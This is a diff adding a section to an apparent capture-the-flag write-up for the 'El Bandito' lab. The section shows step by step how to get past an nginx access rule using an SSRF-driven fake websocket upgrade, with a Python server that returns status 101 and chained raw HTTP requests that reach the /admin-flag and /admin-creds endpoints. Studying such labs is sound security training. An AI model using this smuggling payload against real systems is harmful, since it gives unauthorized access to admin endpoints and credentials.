@@ -594,6 +594,123 @@ Let's visit the accessible endpoints (200). I found that mappings endpoint revel
         {[/error],produces=[text/html]}
         ...
 Especially admin-creds and admin-creds sounds really promising. Of course try to access them directly result in 403 (forbidden). We got this error from NGIX.
+** Note: El Bandito IP will change from now on.
+Ok, now with information we have we can try to think to a possible attack vector to bypass ngix, that is the smuggling technique as illustrated at beginning of this post. To recall here we have trick ngix that a websocket connection between us (attacker) and the backend server (Sping app) is going on, indeed we will perform http request. To do so we have to:
+1. Send a request to the backend server to upgrate to websocket (WS)
+2. NGIX proxy intercept the request and forward it to the server
+3. The forwarded request to the backend server: here we exploit the blind SSRF vulnerability to get an upgrate response (101) from a server we control
+4. The upgrade positive response is send back to us through ngix
+5. ngix verify that the upgrade is completed (101) and permits direct communication between us (the attacker) and the backend server
+6. Doing that we can bypass the policy restriction implemented by ngix that prevent us to access the admin-* endpoints
+
+Sounds really complicated,actually it is not so complicated. First of all we have to check if we can send upgraded request to the backend through the proxy. If we send the following request:
+
+    GET /isOnline HTTP/1.1
+    Host: 10.10.227.168:8080
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Sec-WebSocket-Version: 13
+    Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+    Connection: keep-alive, Upgrade
+    Pragma: no-cache
+    Cache-Control: no-cache
+    Upgrade: websocket
+
+If you want to know more about websocket headers read [this](https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism)
+We got a bad request error that warns us that the url parameter is mandatory
+    
+    {"timestamp":1717102030749,"status":400,"error":"Bad Request","exception":"org.springframework.web.bind.MissingServletRequestParameterException","message":"Required String parameter 'url' is not present","path":"/isOnline"}
+
+Let's now start our controlled server that will respond, using the SSRF vulnerability, with a positive upgrade.
+Follows the code to start the server on the attacker machine:
+
+    import sys
+    from http.server import HTTPServer, BaseHTTPRequestHandler
+
+    class MyServer(BaseHTTPRequestHandler):
+       def do_GET(self):
+           self.protocol_version = "HTTP/1.1"
+           self.send_response(101)
+           self.end_headers()
+    
+    print("Server listen o port 80...");
+    HTTPServer(("", 80), MyServer).serve_forever()
+
+Save the file as myserver.py and execute it. Test with curl
+
+    curl http://10.9.0.169 -v
+    *   Trying 10.9.0.169:80...
+    * Connected to 10.9.0.169 (10.9.0.169) port 80
+    ...
+    * Request completely sent off
+    < HTTP/1.1 101 Switching Protocols
+    < Server: BaseHTTP/0.6 Python/3.11.9
+    ...
+    curl: (52) Empty reply from server
+
+Checking the server console we got:
+
+    python myserver.py
+    Server listen o port 80...
+    10.9.0.169 - - [30/May/2024 22:31:23] "GET / HTTP/1.1" 101 -
+
+Since our web server is working we can try to inject the url parameter in the request to see what happens:
+
+    GET /isOnline?url=http://10.9.0.169 HTTP/1.1
+    ...
+We will see the request to our webserver:
+
+    10.10.227.168 - - [30/May/2024 22:56:24] "GET / HTTP/1.1" 101 -
+
+Then in Burp:
+
+    HTTP/1.1 101 
+    Server: nginx
+    Date: Thu, 30 May 2024 20:56:22 GMT
+    Connection: upgrade
+    X-Application-Context: application:8081
+
+So we can see that ngix has validated (and upgraded) our request. Now we can try to chain another request to the admin stuff to see if we can bypass ngix policy.
+(If you use Burp remember to disable Update content-length and to set 2 carriage returns at the end of the chained request). So the final payload will be:
+    
+    GET /isOnline?url=http://10.9.0.169 HTTP/1.1
+    Host: 10.10.227.168:8080
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Sec-WebSocket-Version: 13
+    Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+    Connection: keep-alive, Upgrade
+    Pragma: no-cache
+    Cache-Control: no-cache
+    Upgrade: websocket
+        
+    GET //admin-flag HTTP/1.1
+    Host: 10.10.227.168:8080
+
+    
+    GET //admin-creds HTTP/1.1
+    Host: 10.10.227.168:8080
+
+    
+We will get the flag and the credentials back!
+
+
+    
+
+
+
+
+
+    
+
+
+
+    
+
+
+
 
     
 
